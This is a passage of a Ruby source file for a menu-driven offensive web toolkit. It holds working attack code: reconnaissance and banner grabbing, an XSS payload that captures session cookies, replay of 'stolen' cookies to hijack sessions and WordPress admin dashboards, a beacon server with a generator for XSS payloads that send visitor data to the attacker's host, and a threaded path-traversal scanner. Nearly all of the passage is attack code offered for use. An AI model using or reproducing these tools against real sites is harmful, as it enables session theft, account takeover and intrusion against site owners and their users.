            r.name.to_s
          when Resolv::DNS::Resource::IN::MX
            "#{r.exchange}(pref #{r.preference})"
          when Resolv::DNS::Resource::IN::TXT
            r.data.join rescue r.data.to_s
          end
        end
      rescue
        []
      end
      print_kv(label, records.empty? ? "(none)" : records.join(', '))
    end

    # CAA record
    section_header("1.a) CAA Records")
    caas = begin
      if Gem.win_platform?
        out, _ = Open3.capture2("nslookup -type=CAA #{host}")
        out.scan(/^\s*(\S+)\s+CAA\s+/i).map(&:first)
      else
        out, _ = Open3.capture2("dig +short CAA #{host}")
        out.lines.map(&:strip)
      end
    rescue
      ["(unsupported)"]
    end
    print_kv("CAA", caas.empty? ? "(none)" : caas.join(', '))

    # Subdomain brute-forcing
    section_header("2) Subdomain Enumeration (brute-force)")
    wordlist = %w[www api admin dev test portal login staging beta m]
    found = []
    wordlist.each do |sub|
      fqdn = "#{sub}.#{host}"
      ips = Resolv.getaddresses(fqdn) rescue []
      if ips.any?
        print_kv(fqdn, ips.join(', '), indent: 4)
        found << fqdn
      end
    end
    puts found.empty? ? "#{BRIGHT_YELLOW}(none found)#{RESET}" : ""
  end

  ### RESOLUTION & REVERSE-DNS ###
  section_header("3) IP Resolution & Reverse DNS")
  ips = is_ip ? [host] : (Resolv.getaddresses(host) rescue [])
  print_kv("Resolved IPs", ips.empty? ? "(none)" : ips.join(', '))
  ips.each do |ip|
    rdns = begin Socket.getnameinfo([ip, 0])[0] rescue "(none)" end
    print_kv(ip, rdns, indent: 4)
  end

  ### WHOIS PHASE ###
  section_header("4) WHOIS Information")
  whois_raw = begin Whois.whois(host).to_s rescue "" end
  created   = whois_raw[/Creation Date:\s*(.+)/i, 1] || "(n/a)"
  updated   = whois_raw[/Updated Date:\s*(.+)/i, 1]  || "(n/a)"
  expires   = whois_raw[/Expiry Date:\s*(.+)/i, 1]   || whois_raw[/Expiration Date:\s*(.+)/i, 1] || "(n/a)"
  registrar = whois_raw[/Registrar:\s*(.+)/i, 1]     || "(n/a)"
  ns        = whois_raw.scan(/Name Server:\s*(\S+)/i).flatten.join(', ') rescue "(none)"
  print_kv("Registrar",   registrar)
  print_kv("Created On",  created)
  print_kv("Updated On",  updated)
  print_kv("Expires On",  expires)
  print_kv("NameServers", ns)

  ### HTTP(S) PHASE ###
  section_header("5) HTTP / HTTPS Recon")
  %w[http https].each do |scheme|
    puts "#{BRIGHT_GREEN}Probing #{scheme.upcase}...#{RESET}"
    uri = URI("#{scheme}://#{host}")
    http = Net::HTTP.new(uri.host, uri.port)
    if scheme == "https"
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end
    http.open_timeout = http.read_timeout = 5
    begin
      res = http.request_head(uri.path.empty? ? "/" : uri.path)
      print_kv("#{scheme.upcase} Status", res.code)
      print_kv("#{scheme.upcase} Server", res["server"] || "(none)")
    rescue
      print_kv("#{scheme.upcase}", "Unreachable/timeout")
    end
  end

  ### TCP BANNER GRAB ###
  section_header("6) TCP Banner Grab")
  ports = [21, 22, 25, 80, 443, 8080, 8443]
  ips.first(5).each do |ip|
    ports.each do |port|
      begin
        Timeout.timeout(3) do
          sock = TCPSocket.new(ip, port)
          sock.write("HELLO\r\n")
          banner = sock.read_nonblock(256) rescue nil
          print_kv("#{ip}:#{port}", banner ? banner.strip : "(open, no banner)")
          sock.close
        end
      rescue
        # silently skip closed/filtered ports
      end
    end
  end

  puts "\n#{BRIGHT_GREEN}=== Enhanced data collection complete! ===#{RESET}\n\n"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- EXPLOIT FUNCTION (#26) / XSS ---
def xss_exploit_and_capture
  require 'selenium-webdriver'
  require 'uri'

  puts "\n#{BRIGHT_GREEN}=== XSS Exploit & Cookie Capture ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter the vulnerable base URL (e.g. https://site/?): #{RESET}"
  base  = gets.chomp.strip
  print "#{BRIGHT_CYAN}Enter the parameter name to inject into (e.g. s): #{RESET}"
  param = gets.chomp.strip

  unless param =~ /\A[A-Za-z0-9_]+\z/
    puts "#{BRIGHT_RED}[!] Invalid parameter name. Only letters, digits, underscore allowed.#{RESET}"
    return
  end

  payload     = "';document.title=document.cookie;//"
  encoded     = URI.encode_www_form_component(payload)
  exploit_url = base.include?('?') ? "#{base}&#{param}=#{encoded}" : "#{base}?#{param}=#{encoded}"

  puts "#{BRIGHT_YELLOW}[*] Exploit URL:#{RESET} #{exploit_url}"

  # Launch headless Chrome (chromedriver must be in PATH)
  opts = Selenium::WebDriver::Chrome::Options.new
  %w[--headless --disable-gpu --no-sandbox --disable-blink-features=AutomationControlled].each do |arg|
    opts.add_argument(arg)
  end
  opts.add_argument(
    "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) "\
    "AppleWebKit/537.36 (KHTML, like Gecko) "\
    "Chrome/114.0.0.0 Safari/537.36"
  )

  begin
    driver = Selenium::WebDriver.for(:chrome, options: opts)
  rescue => e
    puts "#{BRIGHT_RED}[!] Could not start ChromeDriver: #{e.message}#{RESET}"
    return
  end

  begin
    driver.navigate.to(base)
    sleep 1
    original_title = driver.title

    driver.navigate.to(exploit_url)
    sleep 2
    new_title = driver.title

    if new_title != original_title && !new_title.empty?
      puts "#{BRIGHT_GREEN}[+] Payload executed!#{RESET}"
      puts "    document.title now contains: #{new_title}"

      cookie_objects = driver.manage.all_cookies

      filename = "xss_cookie_capture_#{Time.now.to_i}.txt"
      File.open(filename, 'w') do |f|
        f.puts "# Exploit URL: #{exploit_url}"
        f.puts "\n# Original Title: #{original_title}"
        f.puts "\n# New Title (document.cookie):"
        f.puts new_title
        f.puts "\n# Cookie objects:"
        if cookie_objects.empty?
          f.puts "  (none retrieved)"
        else
          cookie_objects.each do |c|
            f.puts "  - #{c[:name]}=#{c[:value]}; domain=#{c[:domain]}; "\
                   "path=#{c[:path]}; HttpOnly=#{c[:httponly]}; Secure=#{c[:secure]}"
          end
        end
      end

      puts "#{BRIGHT_GREEN}[+] All results saved to #{filename}#{RESET}"
    else
      puts "#{BRIGHT_RED}[!] Title did not change—payload likely filtered.#{RESET}"
    end

  rescue => e
    puts "#{BRIGHT_RED}[!] Error during exploit run: #{e.message}#{RESET}"
  ensure
    driver.quit if driver
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Replay Cookie Session Function (#27) ---
def replay_cookie_session
  require 'net/http'
  require 'uri'

  puts "\n#{BRIGHT_GREEN}=== REPLAY COOKIE SESSION ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter your stolen-cookie filename: #{RESET}"
  file = gets.chomp.strip

  unless File.exist?(file)
    puts "#{BRIGHT_RED}[!] File not found: #{file}#{RESET}"
    return
  end

  # 1) Parse cookie lines robustly
  cookies = {}
  File.foreach(file) do |line|
    line = line.strip.gsub("\r", '') # Normalize CRLF
    next if line.empty?

    # Accept both "- name=value;" and "name=value;"
    line = line.sub(/^-\s*/, '')
    pair, _ = line.split(';', 2)
    name, raw_value = pair.split('=', 2)
    next unless name && raw_value

    value = URI.decode_www_form_component(raw_value)
    cookies[name.strip] = value
  end

  if cookies.empty?
    puts "#{BRIGHT_RED}[!] No cookies parsed from #{file}.#{RESET}"
    return
  end

  puts "#{BRIGHT_GREEN}[+] Parsed cookies: #{cookies.keys.join(', ')}#{RESET}"

  # 2) Ask for the protected URL
  print "#{BRIGHT_CYAN}Enter the URL to test replay on (must require login): #{RESET}"
  target = gets.chomp.strip
  uri = URI.parse(target)

  # 3) Build request with all cookies
  req = Net::HTTP::Get.new(uri.request_uri)
  req['Cookie'] = cookies.map { |k, v| "#{k}=#{v}" }.join('; ')

  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')
  http.open_timeout = 5
  http.read_timeout = 5

  # 4) Execute and report
  begin
    res = http.request(req)
    puts "#{BRIGHT_GREEN}Response code: #{res.code}#{RESET}"
    if res.code == "200"
      puts "#{BRIGHT_GREEN}✅ Replay succeeded — protected content retrieved!#{RESET}"
    else
      puts "#{BRIGHT_RED}❌ Replay failed (#{res.code}). Did you hit the right endpoint?#{RESET}"
    end

    snippet = res.body.to_s[0..200].gsub(/\s+/, ' ') rescue "(no preview available)"
    puts "\n#{BRIGHT_CYAN}Response snippet:#{RESET} #{snippet}..."
  rescue => e
    puts "#{BRIGHT_RED}[!] Error during replay: #{e.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- SESSION VERIFICATION USING CUSTOM COOKIE AND DEVICE INFO (28) ---
def session_verify_and_device_info
  require 'selenium-webdriver'
  require 'uri'

  puts "\n#{BRIGHT_GREEN}=== Session Verification & Device Info ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter stolen-cookie filename: #{RESET}"
  cookie_file = gets.chomp.strip

  unless File.exist?(cookie_file)
    puts "#{BRIGHT_RED}[!] File not found: #{cookie_file}#{RESET}"
    return
  end

  # Parse cookies
  cookies = {}
  File.foreach(cookie_file) do |line|
    line = line.strip.gsub("\r", '')  # Normalize CRLF
    next unless line.start_with?('- ')
    pair, = line[2..].split(';', 2)
    name, raw = pair.split('=', 2)
    next unless name && raw
    cookies[name.strip] = URI.decode_www_form_component(raw)
  end

  if cookies.empty?
    puts "#{BRIGHT_RED}[!] No cookies parsed from #{cookie_file}.#{RESET}"
    return
  end

  puts "#{BRIGHT_GREEN}[+] Loaded cookies: #{cookies.keys.join(', ')}#{RESET}"

  # Ask for base and target
  print "#{BRIGHT_CYAN}Enter base site URL (e.g. https://example.com): #{RESET}"
  site = gets.chomp.strip

  base_uri = URI.parse(site) rescue nil
  unless base_uri
    puts "#{BRIGHT_RED}[!] Invalid base URL.#{RESET}"
    return
  end

  print "#{BRIGHT_CYAN}Enter protected URL or path (e.g. /account or full https://...): #{RESET}"
  target_input = gets.chomp.strip
  target = target_input =~ /\Ahttps?:\/\// ? target_input : "#{site.chomp('/')}/#{target_input.sub(/^\//, '')}"

  puts "#{BRIGHT_YELLOW}[*] Will navigate to:#{RESET} #{target}"

  # Ask if headless mode should be used
  print "#{BRIGHT_CYAN}Use headless Chrome? (y/n): #{RESET}"
  headless = gets.chomp.strip.downcase == 'y'

  # Launch Chrome
  opts = Selenium::WebDriver::Chrome::Options.new
  %w[--disable-gpu --no-sandbox].each { |a| opts.add_argument(a) }
  opts.add_argument('--headless') if headless
  opts.add_argument('--disable-blink-features=AutomationControlled')
  opts.add_argument('--window-size=1280,800')
  opts.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36')

  driver = Selenium::WebDriver.for(:chrome, options: opts)

  begin
    # 1) Go to base to set cookies
    driver.navigate.to(site)
    sleep 1

    # 2) Set cookies manually
    cookies.each do |name, value|
      begin
        driver.manage.add_cookie(
          name: name,
          value: value,
          domain: base_uri.host,
          path: '/'
        )
      rescue => cookie_err
        puts "#{BRIGHT_YELLOW}[!] Skipped cookie #{name}: #{cookie_err.message}#{RESET}"
      end
    end

    # 3) Go to protected page
    driver.navigate.to(target)
    sleep 2

    # 4) Ask for private element
    print "#{BRIGHT_CYAN}Enter CSS selector for a private element (e.g. '.profile-email'): #{RESET}"
    selector = gets.chomp.strip

    private_text = begin
      driver.find_element(css: selector).text
    rescue
      "(element not found)"
    end

    # 5) Device info
    ua       = driver.execute_script('return navigator.userAgent')
    platform = driver.execute_script('return navigator.platform')
    screen_w = driver.execute_script('return screen.width')
    screen_h = driver.execute_script('return screen.height')

    # 6) Show results
    puts "\n#{BRIGHT_GREEN}=== Verification Results ===#{RESET}"
    puts "• Element [#{selector}]: #{private_text}"
    puts "• User-Agent       : #{ua}"
    puts "• Platform         : #{platform}"
    puts "• Screen resolution: #{screen_w}×#{screen_h}"

    # 7) Save report
    filename = "session_verify_#{Time.now.to_i}.txt"
    File.open(filename, 'w') do |f|
      f.puts "# Protected URL: #{target}"
      f.puts "\n# Private Element [#{selector}]:"
      f.puts private_text
      f.puts "\n# Device Info:"
      f.puts "User-Agent       : #{ua}"
      f.puts "Platform         : #{platform}"
      f.puts "Screen resolution: #{screen_w}×#{screen_h}"
    end

    puts "#{BRIGHT_GREEN}[+] Report saved to #{filename}#{RESET}"
  rescue => e
    puts "#{BRIGHT_RED}[!] Error in session verification: #{e.message}#{RESET}"
  ensure
    driver.quit
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Network Info During Session (29) ---
def network_info_during_session
  require 'socket'
  require 'net/http'
  require 'uri'
  require 'open3'

  puts "\n#{BRIGHT_GREEN}=== Network Info During Session ===#{RESET}"

  # Local IPv4 addresses
  puts "#{BRIGHT_YELLOW}Local IPv4 Addresses:#{RESET}"
  Socket.ip_address_list.select(&:ipv4?).each do |addr|
    puts "  • #{addr.ip_address}" unless addr.ip_address.start_with?("127.")
  end

  # Default gateway (Linux - using `ip route show default`)
  puts "\n#{BRIGHT_YELLOW}Default Gateway:#{RESET}"
  begin
    stdout, _ = Open3.capture2("ip route show default")
    gateway = stdout[/default via (\d+\.\d+\.\d+\.\d+)/, 1]
    if gateway
      puts "  • #{gateway}"
    else
      puts "  • (not found)"
    end
  rescue
    puts "  • (unable to fetch)"
  end

  # DNS Servers (Linux - from /etc/resolv.conf)
  puts "\n#{BRIGHT_YELLOW}DNS Servers:#{RESET}"
  begin
    resolv_lines = File.readlines("/etc/resolv.conf").grep(/^nameserver\s/)
    if resolv_lines.empty?
      puts "  • (none found)"
    else
      resolv_lines.each do |line|
        puts "  • #{line.split.last.strip}"
      end
    end
  rescue
    puts "  • (unable to read /etc/resolv.conf)"
  end

  # Public IP
  puts "\n#{BRIGHT_YELLOW}Public IP:#{RESET}"
  begin
    public_ip = Net::HTTP.get(URI("https://api.ipify.org"))
    puts "  • #{public_ip}"
  rescue
    puts "  • Unable to fetch"
  end

  puts "\n#{BRIGHT_GREEN}=== End of Network Info ===#{RESET}\n\n"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Cookie File Analysis (30) ---
def analyze_cookie_file
  require 'uri'
  puts "\n#{BRIGHT_GREEN}=== Analyze Cookie File ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter cookie capture filename: #{RESET}"
  file = gets.chomp.strip
  unless File.exist?(file)
    puts "#{BRIGHT_RED}[!] File not found: #{file}#{RESET}"
    return
  end
  cookies = []
  File.foreach(file) do |line|
    next unless line.strip.start_with?('- ')
    pair, rest = line.strip[2..].split(';', 2)
    name, raw_value = pair.split('=', 2)
    next unless name && raw_value
    decoded = URI.decode_www_form_component(raw_value)
    is_b64  = decoded.match?(/\A[A-Za-z0-9+\/]+=*\z/)
    cookies << {
      name:     name.strip,
      raw:      raw_value.strip,
      decoded:  decoded,
      length:   decoded.length,
      base64?:  is_b64,
      attrs:    rest.to_s.split(';').map(&:strip)
    }
  end
  if cookies.empty?
    puts "#{BRIGHT_RED}[!] No cookies parsed.#{RESET}"
    return
  end
  puts "#{BRIGHT_GREEN}[+] Parsed #{cookies.size} cookies:#{RESET}"
  cookies.each do |c|
    puts "  • #{c[:name]}"
    puts "      Raw Value  : #{c[:raw]}"
    puts "      Decoded    : #{c[:decoded][0..50]}#{'…' if c[:decoded].length>50}"
    puts "      Length     : #{c[:length]}"
    puts "      Base64?    : #{c[:base64?] ? 'Yes (opaque token)' : 'No'}"
    puts "      Attributes : #{c[:attrs].join(', ')}"
  end
  puts "\n#{BRIGHT_YELLOW}Recommendation:#{RESET} Session cookies (like sbjs_session) that "+
       "are Base64‐like and not HttpOnly are vulnerable to XSS theft.#{RESET}"
  puts "\n#{BRIGHT_GREEN}=== End of Cookie Analysis ===#{RESET}\n\n"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 31: Check for WordPress Auth Cookies
def check_wp_cookies
  puts "\n#{BRIGHT_GREEN}=== Check for WordPress Auth Cookies ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter cookie capture filename: #{RESET}"
  file = gets.chomp.strip

  unless File.exist?(file)
    puts "#{BRIGHT_RED}[!] File not found#{RESET}"
    return
  end

  wp_cookies = []
  File.foreach(file) do |line|
    next unless line.strip.start_with?('- ')
    name = line.strip.split('=',2).first[2..]
    wp_cookies << name if name.start_with?('wordpress_logged_in_', 'wordpress_sec_')
  end

  if wp_cookies.empty?
    puts "#{BRIGHT_YELLOW}No WordPress auth cookies found in #{file}. You’ll need to XSS-capture an admin session on a page the admin actually visits.#{RESET}"
  else
    puts "#{BRIGHT_GREEN}Found WordPress auth cookies: #{wp_cookies.join(', ')}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 32: Replay into WP-Admin & Detect Dashboard
def wp_admin_replay_and_verify
  require 'net/http'
  require 'uri'

  puts "\n#{BRIGHT_GREEN}=== WP-Admin Session Replay & Verify ===#{RESET}"
  print "#{BRIGHT_CYAN}Cookie file: #{RESET}"
  file = gets.chomp.strip

  unless File.exist?(file)
    puts "#{BRIGHT_RED}[!] File not found: #{file}#{RESET}"
    return
  end

  # Parse every "- name=value" into a hash
  cookies = {}
  File.foreach(file) do |line|
    next unless line.strip.start_with?('- ')
    pair, = line.strip[2..].split(';', 2)
    k, v = pair.split('=', 2)
    cookies[k] = URI.decode_www_form_component(v) if k && v
  end

  if cookies.empty?
    puts "#{BRIGHT_RED}[!] No cookies to replay.#{RESET}"
    return
  end

  print "#{BRIGHT_CYAN}Base site URL (e.g. https://example.com): #{RESET}"
  site = gets.chomp.strip
  uri = URI.join(site, '/wp-admin/')

  # Build the Cookie header
  header = cookies.map { |k, v| "#{k}=#{v}" }.join('; ')

  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')
  req = Net::HTTP::Get.new(uri.request_uri)
  req['Cookie'] = header

  begin
    res = http.request(req)
    puts "#{BRIGHT_GREEN}Response code: #{res.code}#{RESET}"

    # Look for Dashboard markers
    if res.body.include?('wp-adminbar') || res.body.include?('Dashboard')
      puts "#{BRIGHT_GREEN}✅ Admin Dashboard detected! Session hijack confirmed.#{RESET}"
    else
      puts "#{BRIGHT_RED}❌ Dashboard not detected. Cookies likely aren’t admin auth cookies.#{RESET}"
    end
  rescue => e
    puts "#{BRIGHT_RED}[!] Request failed: #{e.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 33: Start Beacon Server for XSS Data Logging
def start_beacon_server
  require 'socket'
  require 'uri'
  require 'json'

  port = 4567
  puts "\n#{BRIGHT_GREEN}=== Starting XSS Beacon Server on port #{port} ===#{RESET}"
  puts "Incoming GET /beacon?ua=…&res=…&lang=… will be logged to beacon_logs.json"
  puts "Press Ctrl+C to stop.\n\n"

  # Ensure log file exists
  File.open("beacon_logs.json", "a") {}

  # Trap Ctrl+C to cleanly exit
  trap("INT") do
    puts "\n#{BRIGHT_YELLOW}Beacon server stopped.#{RESET}"
    exit
  end

  server = TCPServer.new(port)

  loop do
    client = server.accept
    begin
      request_line = client.gets
      if request_line && request_line =~ /^GET\s+([^\s]+)/
        path = $1
        uri = URI.parse(path) rescue nil

        if uri && uri.path == "/beacon"
          params = URI.decode_www_form(uri.query || "").to_h
          entry = {
            timestamp: Time.now.iso8601,
            ip: client.peeraddr.last
          }.merge(params)

          # Write entry to JSON log
          File.open("beacon_logs.json", "a") { |f| f.puts(entry.to_json) }

          puts "#{BRIGHT_GREEN}[+] Beacon from #{entry[:ip]}: UA=#{entry['ua']}, Res=#{entry['res']}#{RESET}"

          client.print "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nOK"
        else
          client.print "HTTP/1.1 404 Not Found\r\n\r\n"
        end
      else
        client.print "HTTP/1.1 400 Bad Request\r\n\r\n"
      end
    rescue => e
      puts "#{BRIGHT_RED}[!] Error handling request: #{e.message}#{RESET}"
    ensure
      client.close
    end
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 34: Generate XSS Beacon Payload
def generate_xss_beacon_payload
  require 'open3'

  puts "\n#{BRIGHT_GREEN}=== Generate XSS Beacon Payload ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter your public IP or hostname (e.g. 1.2.3.4:4567): #{RESET}"
  host = gets.chomp.strip

  unless host =~ /^[\w\.\-]+:\d{2,5}$/
    puts "#{BRIGHT_RED}[!] Invalid host:port format. Example: 1.2.3.4:4567#{RESET}"
    return
  end

  payload = <<~JS.chomp
    <script>
      (function(){
        var ua = navigator.userAgent;
        var res = screen.width + 'x' + screen.height;
        var lang = navigator.language;
        var params = 'ua='+encodeURIComponent(ua)
                   + '&res='+encodeURIComponent(res)
                   + '&lang='+encodeURIComponent(lang);
        (new Image()).src='http://#{host}/beacon?'+params;
      })();
    </script>
  JS

  minified = "<script>(()=>{var u=navigator.userAgent,r=screen.width+'x'+screen.height,l=navigator.language;new Image().src='http://#{host}/beacon?ua='+encodeURIComponent(u)+'&res='+encodeURIComponent(r)+'&lang='+encodeURIComponent(l)})()</script>"

  puts "\n#{BRIGHT_GREEN}== Full Payload ==#{RESET}"
  puts payload

  puts "\n#{BRIGHT_GREEN}== Minified Version ==#{RESET}"
  puts minified

  # Offer clipboard copy if `xclip` is available
  if system('which xclip > /dev/null')
    IO.popen('xclip -selection clipboard', 'w') { |f| f.puts minified }
    puts "\n#{BRIGHT_CYAN}[+] Minified payload copied to clipboard.#{RESET}"
  else
    puts "\n#{BRIGHT_YELLOW}[!] xclip not installed — clipboard copy skipped.#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 35: Show Beacon Logs (Enhanced)
def show_beacon_logs
  require 'json'

  file = "beacon_logs.json"
  puts "\n#{BRIGHT_GREEN}=== Show Beacon Logs ===#{RESET}"

  unless File.exist?(file)
    puts "#{BRIGHT_RED}[!] No beacon_logs.json found.#{RESET}"
    return
  end

  entries = File.readlines(file).map { |l| JSON.parse(l) rescue nil }.compact

  if entries.empty?
    puts "#{BRIGHT_YELLOW}No visits recorded yet.#{RESET}"
    return
  end

  # Sort by most recent
  entries.sort_by! { |e| e['timestamp'] }.reverse!

  # Format output into clean table
  puts "#{BRIGHT_CYAN}%-25s %-15s %-10s %-8s %s#{RESET}" % ["Timestamp", "IP", "Res", "Lang", "User-Agent"]
  puts "-" * 90
  entries.each do |e|
    printf "%-25s %-15s %-10s %-8s %s\n",
      e['timestamp'][0..24],
      e['ip'],
      e['res'],
      e['lang'],
      e['ua'][0..40] + (e['ua'].length > 40 ? '…' : '')
  end

  puts "\n#{BRIGHT_GREEN}[✓] Total beacon hits: #{entries.size}#{RESET}\n"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# ABSOLUTE PATH TRAVERSAL (36.)
require 'net/http'
require 'uri'
require 'concurrent'    # gem install concurrent-ruby
require 'json'
require 'openssl'

# ——— ANSI Color Constants ———
RESET      = "\e[0m"
GREEN      = "\e[32m"
YELLOW     = "\e[33m"
RED        = "\e[31m"
BRIGHT_CYAN = "\e[96m"

# ——— Helpers ———
# Print a section header in bright cyan
def section_header(title)
  puts "\n#{BRIGHT_CYAN}===== #{title} =====#{RESET}\n"
end
def print_kv(key, value, indent: 2)
  spaces = ' ' * indent
  puts "#{spaces}#{key.ljust(50)}: #{value}"
end

def save_body(tag, body, out_dir = "lfi_202_hits")
  Dir.mkdir(out_dir) unless Dir.exist?(out_dir)
  safe = tag.gsub(/[^0-9A-Za-z\-_]/, '_')  
  path = File.join(out_dir, "#{safe}.txt")
  File.write(path, body)  
  print_kv("✔ Saved body", path, indent: 4) 
end


def fetch_when_ready(entry, attempts = 5)
  url       = entry[:location] || entry[:target] 
  wait_secs = (entry[:retry_after] || 3).to_i 

  attempts.times do |i|
    sleep(wait_secs)  
    uri  = URI(url)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl     = (uri.scheme == 'https')
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    req  = Net::HTTP::Get.new(uri.request_uri)

    begin
      res = http.request(req)  # Send GET request
      code = res.code.to_i
            # Colorize status code
      colorized =
        if      (200..299).include?(code) then GREEN  + code.to_s + RESET
        elsif   code == 202                then YELLOW + code.to_s + RESET
        else    RED    + code.to_s + RESET
        end

      if res.is_a?(Net::HTTPSuccess)
        print_kv("  ↪ Poll Success", colorized)
        save_body("#{entry[:ending]}+#{entry[:payload]}", res.body)
        return
      elsif code == 202
        print_kv("  ↻ Still 202", "#{colorized} (retry #{i+1}/#{attempts})")
      else
        print_kv("  ✖ Poll returned", colorized)
        return
      end
    rescue => e
      print_kv("  ! Poll error", RED + e.class.to_s + RESET)
      return
    end
  end
  # All retries exhausted
  print_kv("(!) Giving up after #{attempts} tries", url)
end

# ——— Main Function (Option 36) ———

def absolute_path_traversal_test
  section_header("Absolute Path Traversal Test")

    # 1) Prompt user for the target URL and wordlist files
  print "#{BRIGHT_CYAN}Enter the vulnerable URL (with trailing `=`): #{RESET}"
  base_url = gets.chomp.strip
  print "#{BRIGHT_CYAN}Path to endings file (default 'endings.txt'): #{RESET}"
  endings_file = gets.chomp.strip
  endings_file = 'endings.txt' if endings_file.empty?
  print "#{BRIGHT_CYAN}Path to payload file (default 'payloads.txt'): #{RESET}"
  payload_file = gets.chomp.strip
  payload_file = 'payloads.txt' if payload_file.empty?

 # 2) Load endings and payloads into arrays, skipping blank lines
  endings  = File.readlines(endings_file).map(&:strip).reject(&:empty?)
  payloads = File.readlines(payload_file).map(&:strip).reject(&:empty?)
  section_header("Loaded #{endings.size} endings & #{payloads.size} payloads")

  # 3) Spawn threads to test every combination of ending + payload
  entries = []  # Holds results for later processing
  pool    = Concurrent::FixedThreadPool.new(10)  # Limit to 10 concurrent HTTP requests
  section_header("Launching threaded scan")

  endings.each do |ending|
    payloads.each do |payload|
      pool.post do
        # Construct full test URL
        url_base = base_url.chomp('=') # Remove trailing '=' if present
        full_url = "#{url_base}#{ending}=#{URI.encode_www_form_component(payload)}"
        entry    = { ending: ending, payload: payload, target: full_url }

        begin
          uri  = URI(full_url)
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl     = (uri.scheme == 'https')
          http.verify_mode = OpenSSL::SSL::VERIFY_NONE
          http.open_timeout = http.read_timeout = 5
          req = Net::HTTP::Get.new(uri.request_uri)
          res = http.request(req)

          # Record status and any redirect headers
          code = res.code.to_i
          entry[:status]      = code
          entry[:location]    = res['location']
          entry[:retry_after] = res['retry-after']
          # Colorize based on status code category
          colorized =
            if      (200..299).include?(code) then GREEN  + code.to_s + RESET
            elsif   (300..399).include?(code) then YELLOW + code.to_s + RESET
            else    RED    + code.to_s + RESET
            end
        rescue => e
          # Capture any network or HTTP errors
          entry[:status]   = "Err:#{e.class}"
          colorized        = RED + entry[:status] + RESET
        end
        # Print the result of this test
        print_kv("#{ending} + #{payload}", colorized)
        entries << entry
      end
    end
  end
# Wait for all threads to finish
  pool.shutdown
  pool.wait_for_termination

  # 4) Handle any 3xx redirects by re-testing the Location URL
  redirects = entries.select { |e| e[:status].is_a?(Integer) && (300..399).include?(e[:status]) && e[:location] }
  if redirects.any?
    section_header("Re-testing 3xx Redirects")
    redirects.each do |e|
      new_url = e[:location].start_with?('http') ? e[:location] : URI.join(base_url, e[:location]).to_s
      print_kv("→ Redirect GET", new_url)

      begin
        # Parse the new redirect URL into its components (scheme, host, port, path, query)
        uri  = URI(new_url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl     = (uri.scheme == 'https')
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        res = http.request_get(uri.request_uri)
        code      = res.code.to_i
        colorized =
          if      (200..299).include?(code) then GREEN  + code.to_s + RESET
          elsif   (300..399).include?(code) then YELLOW + code.to_s + RESET
          else    RED    + code.to_s + RESET
          end
        print_kv("   Status", colorized)
        save_body("#{e[:ending]}+#{e[:payload]}", res.body) if res.is_a?(Net::HTTPSuccess)
      rescue => ex
        print_kv("   ! Error", RED + ex.class.to_s + RESET)
      end
    end
  end

  # 5) Poll 202 Accepted responses until they complete or timeout
  accepted = entries.select { |e| e[:status] == 202 }
  if accepted.any?
    section_header("Polling 202 Accepted Responses")
    accepted.each { |e| fetch_when_ready(e) }
  end

  section_header("Absolute Path Traversal scan complete!")
end
#----------------------------------------------------------------------------------------------------------------------------------------
# STORAGE ENUMERATOR (37.)
def storage_enumerator
  # Print a header indicating the start of the storage enumeration function
  section_header("37) Storage Directory Enumerator")
  # Prompt the user to enter the base URL of the storage directory
  print "#{BRIGHT_CYAN}Enter base storage URL (e.g. https://site/storage/): #{RESET}"
  base = gets.chomp.strip
  # Ensure the URL ends with a slash to form valid paths
  base << "/" unless base.end_with?("/")
  # Inform the user that the directory index is being fetched
  puts "#{BRIGHT_GREEN}Fetching directory index for #{base}#{RESET}"
  # Parse the user-provided URL into a URI object
  uri = URI(base)
   # Initialize an HTTP client, enabling SSL if needed
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == "https")
  # Set timeouts to avoid hanging the request
  http.open_timeout = http.read_timeout = 5
  begin
    # Send an HTTP GET request to retrieve the directory listing page
    res = http.get(uri.request_uri)
  rescue => e
    # On error, display the exception and exit the function
    puts "#{BRIGHT_RED}[!] Error fetching index: #{e.class} – #{e.message}#{RESET}"
    return
  end
  # Check if the HTTP response was successful (2xx status code)
  if res.is_a?(Net::HTTPSuccess)
     # Extract all href values from the HTML, then clean and filter them
    entries = res.body.scan(/href=["']?([^"' >]+)["']?/i)
                      .flatten # Flatten nested arrays
                      .map(&:strip) # Remove surrounding whitespace
                      .uniq  # Remove duplicate entries
                      .reject { |h| h == "../" || h == "./" }  # Exclude parent directory links
                      # Notify the user if no entries were found
    if entries.empty?
      puts "#{BRIGHT_YELLOW}(no directory listing entries found)#{RESET}"
    else
      # Display each discovered entry
      puts "#{BRIGHT_GREEN}[+] Apache/Nginx index entries:#{RESET}"
      entries.each do |e|
        puts " • #{e}"
      end
    end
